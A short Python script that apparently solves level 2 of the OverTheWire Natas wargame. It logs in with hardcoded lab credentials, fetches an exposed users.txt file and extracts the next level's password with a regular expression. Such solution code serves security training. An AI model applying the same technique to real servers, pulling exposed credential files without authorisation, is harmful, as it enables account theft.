import requests as r
import re


def auth(username,password,URL):

    with r.session() as s:
        response = s.get(URL, auth =(username,password))
        content =response.text
        print(re.findall("natas3:(.*)", content)[0])

def main():
    username = 'natas2'
    password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'
    URL = f"http://{username}.natas.labs.overthewire.org/files/users.txt"
    results = auth(username,password,URL)
    
main()

